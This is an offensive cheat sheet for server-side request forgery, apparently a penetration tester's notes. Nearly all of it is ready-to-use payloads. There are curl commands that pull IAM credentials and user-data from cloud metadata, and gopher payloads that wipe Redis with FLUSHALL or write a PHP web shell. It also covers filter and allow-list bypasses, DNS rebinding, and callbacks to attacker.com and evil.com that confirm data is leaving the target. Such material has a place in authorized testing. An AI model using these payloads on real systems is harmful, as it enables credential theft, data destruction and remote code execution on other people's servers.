# force servers to attack internal networks. pivot through web applications.

## quick test payloads

internal service discovery:
```
http://127.0.0.1/
http://localhost:8080/admin
http://127.0.0.1:3000/metrics
http://127.0.0.1:6379/ (redis)
http://127.0.0.1:5432/ (postgres)
```

cloud metadata extraction:
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
```

## common injection points

url parameters:
```
/fetch?url=http://evil.com
/proxy?target=http://internal.local
/webhook?callback=http://attacker.com
/image?src=http://127.0.0.1:8080
```

json payloads:
```json
{"url": "http://127.0.0.1/admin"}
{"webhook": "http://attacker.com/callback"}
{"redirect": "http://internal.service"}
```

## filter bypass techniques

**ip encoding variations:**
```
# decimal encoding
http://2130706433/ (127.0.0.1)

# hex encoding  
http://0x7f000001/

# octal encoding
http://0177.0.0.1/

# short form
http://127.1/
http://127.0.1/
```

**protocol alternatives:**
```
gopher://127.0.0.1:6379/_PING
file:///etc/passwd  
ftp://127.0.0.1/
dict://127.0.0.1:6379/info
```

**dns rebinding:**
```
# register subdomain that resolves to internal ip
http://internal.attacker.com/ (points to 127.0.0.1)
http://admin.evil.com/ (points to 192.168.1.1)
```

## cloud metadata exploitation

**aws metadata:**
```bash
# list iam roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]

# user data (often contains secrets)
curl http://169.254.169.254/latest/user-data
```

**azure metadata:**
```bash
# requires metadata header
curl -H "Metadata: true" http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
```

**gcp metadata:**
```bash
# requires metadata-flavor header  
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
```

## out-of-band verification

dns interaction:
```
http://collaborator-domain.com/
http://unique-id.dnslog.cn/
```

http callbacks:
```
http://attacker.com/log?ssrf=confirmed&host=TARGET
```

## time-based detection

test for internal services via response timing:
```bash
# fast response = service exists
/fetch?url=http://127.0.0.1:80

# slow/timeout = service doesn't exist  
/fetch?url=http://127.0.0.1:9999
```

## exploiting internal services

**redis exploitation:**
```
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1:6379/_FLUSHALL
gopher://127.0.0.1:6379/_SET%20shell%20"<?php system($_GET[cmd]); ?>"
```

**memcached:**
```
gopher://127.0.0.1:11211/_stats
```

**fastcgi:**
```
gopher://127.0.0.1:9000/[fastcgi-payload]
```

## bypass techniques for common defenses

**deny list bypass:**
```
# localhost alternatives
0, 0.0.0.0, 127.1, 2130706433, 017700000001

# cloud metadata alternatives  
http://[::1]/  (ipv6 localhost)
http://admin.internal.attacker.com/ (dns to internal ip)
```

**allow list bypass:**
```
# subdomain confusion
https://allowed-domain.com.attacker.com/
https://allowed-domain.com@attacker.com/
https://allowed-domain.com#@attacker.com/

# open redirect abuse
https://allowed-domain.com/redirect?url=http://internal.service/
```

## operational notes

- test all user-controlled url parameters
- [!] ssrf can lead to internal network pivoting - document everything  
- cloud metadata often contains iam keys and secrets
- combine with other vulns for rce (redis -> webshell upload)
- response content and timing reveal internal service fingerprints

**tools:**
- ssrfmap for automated exploitation
- gopherus for protocol payloads  
- collaborator/dnslog for oob verification

# TODO: add detection evasion for common ssrf waf rules